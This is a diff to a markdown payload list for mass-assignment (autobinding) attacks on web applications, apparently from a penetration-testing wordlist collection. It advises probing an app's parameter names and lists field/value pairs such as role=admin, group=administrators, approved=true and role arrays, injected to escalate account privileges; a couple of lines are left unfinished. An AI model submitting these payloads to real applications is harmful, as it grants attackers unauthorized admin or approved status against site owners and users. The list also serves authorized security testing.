@@ -1,6 +1,31 @@
-# MassAssignment
+# MassAssignment (Or Autobinding) 
+
+Best results is to investigate all the pages of the app looking for patterns in parameter names. For example, if other fields are user_name and user_email, then possible candidates for Mass Assignment might be user_role and user_group.
+Look at documentation and any other 
+
+These are common attributes for user accounts useful in privilege escalation 
+enabled=true
+processed=true
+approved=true
+approval=true
+user_approval=true
+onboard=true
+user_onboarded=true
+user_onboarded=1
+enabled=1
+status=enabled
+user_status=enabled
+
 These are parameter name value pairs to attempt privilege escalation via mass assignment
+
 role=admin
+role=site_admin
+role=site_edit
+group=admins
+group=administrators
+groups=[admin,user_management,editor,
+roles might be an array:
+roles=[add_user,delete_user, edit_user,create_user,view_user]
 role=0
 ..
 role=9
